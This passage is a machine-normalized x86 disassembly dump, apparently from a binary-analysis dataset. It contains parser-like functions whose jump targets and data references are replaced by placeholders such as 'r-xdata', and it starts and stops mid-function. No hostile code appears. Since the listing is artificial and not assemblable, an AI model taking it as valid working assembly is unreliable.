pop ebp
retn
push edi
lea ecx [ ebp - 0x8 ]
push ecx
push esi
mov [ ebp - 0x8 ] r--data
mov [ ebp - 0x4 ] 0x33
call sub_10054b70
add esp 0xc
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
lea edx [ eax + 0x1 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edi [ ecx + 0xc ]
dec edi
mov eax [ ebx + 0x18 ]
mov [ ebp + 0x8 ] eax
js r-xdata
push esi
call sub_100742c0
push esi
mov eax ebx
call sub_10074e00
push esi
mov eax ebx
call sub_10074da0
push esi
mov eax 0x1
call sub_10073fd0
add esp 0x10
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_10073b20
mov eax [ esi + 0xc ]
mov [ eax + 0x38 ] 0x1
xor ecx ecx
cmp eax 0x6f
sete cl
mov eax ecx
test eax eax
je r-xdata
push 0x4
mov eax ebx
call sub_10074140
add esp 0x4
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001d270
push 0x4c
push esi
call sub_10013bb0
mov edi r--data
mov ebx eax
push edi
push esi
mov [ ebx ] 0x0
call sub_1004ab70
push r--data
push esi
mov [ ebx + 0x4 ] eax
call sub_1004ab70
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x8 ] edi
mov eax 0x4
mov [ ebx + 0xc ] eax
mov eax r--data
mov [ ebx + 0x14 ] eax
mov eax 0x7
mov [ ebx + 0x18 ] eax
mov edx [ r--data ]
mov [ ebx + 0x1c ] edx
mov eax [ r--data ]
mov [ ebx + 0x20 ] eax
mov ecx [ r--data ]
mov [ ebx + 0x24 ] ecx
mov edx [ r--data ]
mov [ ebx + 0x28 ] edx
mov eax [ r--data ]
mov [ ebx + 0x2c ] eax
mov ecx [ r--data ]
mov [ ebx + 0x30 ] ecx
mov edx [ r--data ]
mov [ ebx + 0x34 ] edx
mov eax [ r--data ]
mov [ ebx + 0x38 ] eax
mov ecx [ r--data ]
mov [ ebx + 0x3c ] ecx
mov edx [ r--data ]
mov [ ebx + 0x40 ] edx
mov edx [ ebp - 0x4 ]
mov eax [ r--data ]
add edx 0x4c
push edx
mov [ ebx + 0x44 ] eax
mov ecx [ r--data ]
push ebx
push esi
mov [ ebx + 0x48 ] ecx
call sub_10006860
mov eax esi
call sub_10073b20
mov eax esi
call sub_10073b20
push 0x1a
mov eax 0x20
mov ecx esi
call sub_10073f70
add esp 0x30
mov eax esi
call sub_10073b20
mov eax esi
call sub_10073b20
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov eax [ edx + ebx * 4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov ecx [ eax + edi * 4 ]
cmp [ ecx + 0x20 ] 0x0
mov [ ebp + 0xc ] ecx
jne r-xdata
mov edx ebx
cmp [ edx + 0x28 ] 0x0
je r-xdata
push esi
call sub_100742c0
mov edi ebx
mov ebx esi
call sub_10073f30
push esi
call sub_10073370
mov esi [ esi + 0xc ]
mov eax [ esi ]
add esp 0x8
cmp eax 0x8
je r-xdata
mov edx [ edi ]
mov [ edx + ebx * 4 ] 0x0
inc ebx
cmp ebx [ edi + 0x4 ]
jb r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
sub eax edx
push edi
push esi
mov ebx eax
call sub_10028ff0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
push edx
push esi
call sub_1004ab70
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x4 ] ebx
push eax
inc ebx
push esi
mov [ edi + 0x8 ] ebx
call sub_10044040
add esp 0x18
jmp r-xdata
call sub_10074a80
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax ecx
call sub_100737d0
add esp 0x4
test eax eax
jne r-xdata
pop edi
mov [ esi ] 0x10
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0xa
je r-xdata
cmp eax [ ebp - 0xc ]
je r-xdata
push 0x6d
mov eax 0x20
mov ecx esi
call sub_10073f70
mov edi [ ebp - 0x10 ]
xor ebx ebx
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ edi + 0x4 ] ebx
jbe r-xdata
dec edi
jns r-xdata
mov edi edx
call sub_10074860
mov edi [ ebp + 0xc ]
cmp eax 0xc
je r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x4c
push ecx
push eax
push esi
call sub_10006860
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_10073b20
cmp edi eax
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0xd
je r-xdata
cmp eax 0xe
je r-xdata
pop edi
mov [ esi ] 0xf
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
sub_100770b0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax [ edi ]
cmp eax 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0xc ]
add esi 0x48
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp eax 0x4
je r-xdata
mov edx [ edi + 0x18 ]
push esi
push edx
push eax
call sub_1005ada0
add esp 0xc
cmp [ edi ] 0x5
jne r-xdata
mov edx [ edi + 0x10 ]
mov [ esi + 0xc ] edx
mov ecx [ edi + 0x4 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x8 ]
mov [ esi + 0x14 ] edx
mov ecx [ edi + 0xc ]
mov [ esi + 0x18 ] ecx
mov esi [ ebp + 0x8 ]
cmp eax 0x7
jne r-xdata
mov eax [ edi + 0x18 ]
push eax
push r--data
call sub_100386a0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov [ esi + 0x1c ] 0x2
mov eax esi
call sub_10073b20
mov esi [ esi + 0xc ]
mov ecx [ esi + 0x4 ]
pop edi
mov [ esi ] ecx
mov eax 0x1
pop esi
pop ebp
retn
push esi
mov eax edi
call sub_10073670
mov eax [ esi + 0xc ]
add esp 0x4
mov [ eax + 0x34 ] 0x1
sub_10077160
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0xc ]
mov [ ebp - 0x4 ] ecx
cmp esi 0x5
je r-xdata
mov edx [ ecx ]
mov eax 0x1
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x34 ] eax
mov ecx [ edi + 0xc ]
pop edi
pop esi
mov [ ecx ] 0x9
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x4
je r-xdata
test esi esi
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
mov eax ebx
call sub_10073670
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_1001d270
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x1
jne r-xdata
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
push 0x96
push 0x66
push 0x68
push 0x67
push 0x64
push 0x65
push 0x63
push 0x1
mov eax ebx
call sub_10073730
add esp 0x20
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x60
sete cl
test ecx ecx
je r-xdata
mov esi ebx
mov ebx eax
mov eax edi
call sub_10073c00
mov edx [ ecx + 0x8 ]
mov eax [ edx + eax * 4 - 0x4 ]
mov ecx 0x5f
cmp esi 0x1
jne r-xdata
mov esi edi
call sub_10073cc0
mov eax [ edi + 0xc ]
push 0x96
push 0x66
push 0x68
mov [ eax ] 0xc
push 0x67
push 0x1
mov eax ebx
call sub_10073730
add esp 0x14
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x61
sete cl
test ecx ecx
je r-xdata
mov esi edi
call sub_10073cc0
mov ebx r--data
call sub_10074250
mov edi [ ebp + 0xc ]
mov ebx esi
call sub_10073f30
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0xa
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] ecx
sete al
test eax eax
je r-xdata
mov edi ebx
mov ebx esi
call sub_10073f30
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push 0x63
mov eax 0x8
mov ecx edi
call sub_10073f70
mov ecx [ ebp - 0x4 ]
add esp 0x4
pop edi
pop esi
mov [ ecx + 0x34 ] 0x1
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
cmp eax 0x62
sete dl
mov eax edx
test eax eax
je r-xdata
mov esi edi
call sub_10073cc0
mov edi ebx
mov ebx esi
call sub_10073f30
mov ecx [ ebx + 0xc ]
pop edi
pop esi
mov [ ecx ] 0xb
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x0
push 0x61
push 0x62
push 0x60
push 0xa
push 0x0
mov eax ebx
call sub_10073730
add esp 0x34
test eax eax
mov eax ebx
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] ecx
sete al
test eax eax
je r-xdata
push edi
mov eax ebx
call sub_10073670
add esp 0x4
mov esi edi
call sub_100748e0
test eax eax
je r-xdata
mov esi edi
call sub_10073cc0
push 0x61
mov eax 0x8
mov ecx edi
call sub_10073f70
mov ecx [ edi + 0xc ]
add esp 0x4
mov eax 0x1
mov [ ecx + 0x34 ] eax
mov edx [ edi + 0xc ]
pop edi
pop esi
mov [ edx ] 0xb
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x7
push 0x6
push 0x1
call sub_10073730
add esp 0x10
test eax eax
je r-xdata
push edi
call sub_10073670
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_1001d270
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov esi edi
call sub_100748e0
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_1001d270
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + 0xc ]
pop edi
pop esi
mov [ edx + 0x34 ] 0x1
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x1
jne r-xdata
push ebx
push edi
call sub_10075980
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov eax ebx
call sub_10073670
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x7
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x6d
sete al
test eax eax
je r-xdata
push edi
mov eax ebx
call sub_10073670
mov esi [ ebp - 0x4 ]
push ebx
push edi
mov [ esi + 0x44 ] 0x1
call sub_10075cb0
add esp 0xc
pop edi
mov [ esi + 0x44 ] 0x0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
mov eax edi
call sub_10073470
call sub_100737d0
add esp 0x4
jmp r-xdata
mov esi [ ebx ]
cmp esi 0x1
jne r-xdata
push r--data
lea ecx [ ebx + 0x1c ]
mov eax r--data
call sub_100732c0
add esp 0x4
test eax eax
je r-xdata
test eax eax
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x69
sete al
test eax eax
je r-xdata
push edi
mov eax ebx
call sub_10073670
mov edi ebx
mov ebx [ ebp + 0x8 ]
add esp 0x4
call sub_10073f30
mov eax ebx
call sub_10073b20
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov eax ebx
call sub_10073670
mov ecx [ ebp - 0x4 ]
add esp 0x4
cmp [ ecx + 0x30 ] 0x0
je r-xdata
mov edi ebx
mov ebx [ ebp + 0x8 ]
call sub_10073f30
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x30 ] eax
mov eax ebx
call sub_10073b20
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_1001d270
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_10077530
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push esi
cmp ecx 0x6
jne r-xdata
push edi
cmp ecx 0x5
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_10073670
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001d270
add esp 0xc
xor eax eax
pop esi
pop ebp
retn
mov edi eax
mov eax [ ebp + 0x8 ]
call sub_100740e0
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp ecx 0x4
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0xc ]
xor edi edi
cmp [ esi + 0x4c ] edi
jbe r-xdata
mov edi ebx
call sub_100739c0
mov edx [ esi + 0x4 ]
pop ebx
mov eax 0x1
pop edi
mov [ esi + 0x44 ] 0x0
mov [ esi + 0x34 ] eax
mov [ esi ] edx
pop esi
pop ebp
retn
mov edx [ esi + 0x48 ]
movsx eax [ edx + edi ]
push eax
call sub_10002c6e
add esp 0x4
test eax eax
je r-xdata
push ebx
mov [ esi + 0x44 ] 0x1
call sub_100742c0
add esp 0x4
mov ecx [ esi + 0x48 ]
cmp [ edi + ecx ] 0xb
je r-xdata
inc edi
cmp edi [ esi + 0x4c ]
jb r-xdata
jmp r-xdata
sub_100775e0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov ebx [ ebp + 0xc ]
push edi
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x61
push 0x62
mov edi 0x60
push edi
mov esi 0x1
push esi
mov eax ebx
call sub_10073730
add esp 0x2c
test eax eax
jne r-xdata
push 0x96
push 0x5f
push 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0x8 ]
push ecx
lea eax [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] eax
call sub_100744e0
add esp 0x18
test eax eax
jne r-xdata
push 0x96
push 0x5f
push edi
push eax
mov eax ebx
call sub_10073730
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebx ] 0x2
jne r-xdata
push esi
mov eax ebx
call sub_10073670
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001d270
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push eax
push 0x61
push 0x62
push 0xa
push eax
mov eax ebx
call sub_10073730
add esp 0x30
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_10073670
mov ecx [ esi + 0xc ]
add esp 0x4
mov [ ecx + 0x34 ] 0x1
xor eax eax
cmp [ ebx + 0x18 ] edi
sete al
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push ebx
push edx
call sub_10075cb0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax ebx
call sub_10073670
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001d270
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ edx + ecx * 4 - 0x4 ]
mov edi 0x96
call sub_10074860
mov eax [ esi + 0xc ]
mov ecx [ eax + 0xc ]
mov edi 0x1
test ecx ecx
je r-xdata
push esi
mov eax ebx
call sub_10073670
add esp 0x4
push 0x60
mov eax esi
call sub_10073470
call sub_100737d0
add esp 0x4
test eax eax
jne r-xdata
cmp [ ecx + 0x1c ] 0x60
je r-xdata
xor edi edi
mov eax esi
call sub_10073b20
push 0x60
mov eax esi
call sub_10073470
call sub_100737d0
add esp 0x4
test eax eax
je r-xdata
mov eax esi
call sub_10073b20
mov ebx esi
call sub_100743d0
mov eax [ esi + 0xc ]
mov [ eax ] 0x8
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10077790
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
mov edx [ edi ]
cmp edx 0x4
jne r-xdata
push esi
test edx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
call sub_100740e0
mov eax 0x1
pop edi
pop ebp
retn
push ebx
cmp edx 0x3
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_10073670
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001d270
add esp 0xc
pop esi
xor eax eax
pop edi
pop ebp
retn
mov esi 0x1
cmp edx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
cmp edx 0x2
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_10073c00
pop ebx
pop esi
mov eax 0x1
pop edi
pop ebp
retn
mov esi edi
mov ebx edx
call sub_10073c00
lea eax [ ebx + 0x1 ]
pop ebx
pop esi
pop edi
pop ebp
retn
mov ebx [ ebp + 0x8 ]
cmp edx 0x7
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] 0x62
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x62
sete cl
mov eax ecx
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_10075cb0
add esp 0x8
pop ebx
pop esi
pop edi
pop ebp
retn
mov eax ebx
call sub_10073470
mov ecx [ ebx + 0x4 ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov eax ebx
call sub_10073470
mov edx [ ebx + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_10073670
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001d270
add esp 0xc
pop ebx
pop esi
xor eax eax
pop edi
pop ebp
retn
mov ebx [ ebp + 0x8 ]
call sub_10073f30
mov eax ebx
call sub_10073b20
mov edx [ ebx + 0xc ]
pop ebx
mov [ edx + 0x38 ] esi
mov eax esi
pop esi
pop edi
pop ebp
retn
mov eax ebx
call sub_10073b20
mov edx [ ebx + 0xc ]
mov [ edx ] 0x8
cmp [ edi ] 0x2
jne r-xdata
push ebx
mov eax edi
call sub_10073670
add esp 0x4
pop ebx
pop esi
xor eax eax
pop edi
pop ebp
retn
pop ebx
mov eax esi
pop esi
pop edi
pop ebp
retn
mov eax [ ebx + 0xc ]
mov [ eax + 0x34 ] esi
xor eax eax
cmp [ edi + 0x18 ] 0x61
sete al
test eax eax
jne r-xdata
sub_10077900
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ edi ]
mov esi 0x1
cmp ebx esi
jne r-xdata
push 0x96
push 0x68
push 0x67
push esi
mov eax edi
call sub_10073730
add esp 0x10
test eax eax
mov eax edi
je r-xdata
xor eax eax
cmp [ edi + 0x18 ] 0x66
sete al
test eax eax
je r-xdata
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
call sub_10073730
add esp 0x14
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_10073670
push ebx
call sub_1000f0b0
push 0x66
call sub_10073d10
mov edi eax
or [ edi + 0xc ] 0x9
push 0x0
mov ecx ebx
call sub_10073e80
add esp 0x10
push edi
push 0x66
call sub_1004bc00
add esp 0x4
push eax
push r--data
call sub_100386a0
mov edx [ ebx + 0xc ]
add esp 0xc
mov [ edx + 0x34 ] esi
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0xd
xor eax eax
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push ebx
call sub_1000f0b0
push 0x0
push ebx
call sub_10073dc0
push 0x0
mov ecx ebx
mov edi eax
call sub_10073e80
mov eax [ edi + 0x1c ]
add esp 0x10
push edi
push eax
call sub_1004bc00
add esp 0x4
push eax
push r--data
call sub_100386a0
mov ecx [ ebx + 0xc ]
add esp 0xc
pop edi
mov eax esi
pop esi
mov [ ecx ] 0xd
pop ebx
pop ebp
retn
push 0x96
push 0x64
push 0x65
push 0x63
push 0x61
push 0x62
push 0x60
push esi
mov eax edi
call sub_10073730
add esp 0x20
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov eax [ edi + 0x18 ]
push ebx
call sub_100747e0
add esp 0x4
push ebx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
mov eax 0x63
call sub_100747e0
add esp 0x4
test eax eax
jne r-xdata
cmp ebx 0x2
jne r-xdata
mov eax edi
call sub_10073670
mov ecx [ ebx + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push ebx
call sub_1001d270
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
call sub_1000f0b0
add esp 0x4
mov eax ebx
call sub_10073b20
mov eax [ ebx + 0xc ]
pop edi
mov [ eax ] 0x8
mov eax esi
pop esi
pop ebx
pop ebp
retn
push ebx
call sub_1000f0b0
add esp 0x4
mov eax ebx
call sub_10073b20
mov eax [ ebx + 0xc ]
mov [ eax ] 0x8
mov ecx [ ebx + 0xc ]
pop edi
mov [ ecx + 0x34 ] esi
mov eax esi
pop esi
pop ebx
pop ebp
retn
push ebx
mov eax 0x64
call sub_100747e0
add esp 0x4
test eax eax
jne r-xdata
push 0x96
push 0x68
push 0x67
push 0x0
push 0x61
push 0x66
push 0x62
push 0x60
push 0xa
push 0x0
mov eax edi
call sub_10073730
add esp 0x28
test eax eax
je r-xdata
cmp [ edi + 0x18 ] 0x5f
sete al
test eax eax
jne r-xdata
push ebx
mov eax 0x65
call sub_100747e0
add esp 0x4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push edi
push eax
call sub_10077160
add esp 0x8
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_10073670
mov ecx [ esi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push esi
call sub_1001d270
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
push ebx
sub_10077b40
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x96
push 0x67
push 0x68
mov ebx 0x1
push ebx
mov eax edi
call sub_10073730
add esp 0x10
test eax eax
je r-xdata
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x61
push 0x60
push ebx
mov eax edi
call sub_10073730
add esp 0x20
test eax eax
jne r-xdata
mov esi [ ebp + 0x8 ]
call sub_10073c70
push 0x0
push esi
call sub_10073dc0
push 0x0
mov ecx esi
mov edi eax
call sub_10073e80
mov eax [ edi + 0x1c ]
add esp 0xc
push edi
push eax
call sub_1004bc00
add esp 0x4
push eax
push r--data
call sub_100386a0
mov ecx [ esi + 0xc ]
add esp 0xc
mov ebx r--data
mov edi esi
mov [ ecx ] 0xe
call sub_10074250
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
mov eax edi
call sub_10073730
add esp 0x14
test eax eax
je r-xdata
push 0x96
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x66
push eax
mov eax edi
call sub_10073730
add esp 0x1c
test eax eax
jne r-xdata
mov esi 0x66
mov esi [ edi + 0x18 ]
jmp r-xdata
push 0x96
push 0x68
push 0x67
push eax
push 0x61
push 0x62
push 0x60
push 0xa
push eax
mov eax edi
call sub_10073730
add esp 0x24
test eax eax
je r-xdata
mov esi ebx
call sub_10073c70
mov eax ebx
call sub_10073b20
mov edx [ ebx + 0xc ]
mov [ edx ] 0xc
cmp [ edi ] 0x2
jne r-xdata
push esi
call sub_1004bc00
push eax
push r--data
call sub_100386a0
mov eax [ ebx + 0xc ]
xor esi esi
add esp 0xc
cmp [ eax + 0xc ] esi
jbe r-xdata
push 0x96
push 0x5f
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
push ebx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x10 ] edx
call sub_100744e0
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_10077160
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_10073670
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001d270
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0xc ]
mov [ eax + 0x34 ] 0x1
xor eax eax
cmp [ edi + 0x18 ] 0x66
sete al
test eax eax
jne r-xdata
push ebx
mov eax edi
call sub_10073670
mov eax [ ebx + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push ebx
call sub_1001d270
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax + 0x8 ]
mov eax [ ecx + esi * 4 ]
mov edx [ eax + 0x1c ]
push edx
call sub_1004bc00
push eax
push r--data
call sub_100386a0
mov eax [ ebx + 0xc ]
inc esi
add esp 0xc
cmp esi [ eax + 0xc ]
jb r-xdata
sub_10077d60
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x96
push 0x68
push 0x67
push 0x0
mov eax edi
call sub_10073730
add esp 0x10
mov ebx 0x1
push 0x96
test eax eax
je r-xdata
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x61
push 0x62
push 0x60
push ebx
mov eax edi
call sub_10073730
add esp 0x2c
test eax eax
je r-xdata
mov esi [ edi + 0x18 ]
push 0x5f
push 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp + 0x8 ]
push ecx
lea eax [ ebp - 0x4 ]
push ebx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x10 ] eax
call sub_100744e0
add esp 0x18
test eax eax
jne r-xdata
push 0x96
push 0x0
push 0x61
push 0x62
push 0x60
push 0xa
push 0x0
mov eax edi
call sub_10073730
add esp 0x1c
test eax eax
mov eax edi
je r-xdata
push r--data
call sub_100386a0
mov esi [ ebp + 0x8 ]
push 0x96
push 0x5f
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x68
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
call sub_100744e0
add esp 0x1c
test eax eax
jne r-xdata
push edi
mov eax esi
mov ecx ebx
call sub_10074950
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
mov eax edi
call sub_10073670
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x0
call sub_10073730
add esp 0x1c
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_10073670
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001d270
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
mov [ edx + 0x34 ] ebx
call sub_10074a00
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x5f
push eax
push eax
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x67
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
call sub_100744e0
add esp 0x18
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_10075cb0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ edi + 0x18 ]
push esi
call sub_100747e0
add esp 0x4
test eax eax
jne r-xdata
push r--data
call sub_100386a0
push esi
mov eax edi
call sub_10073670
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001d270
add esp 0x10
pop edi
pop esi
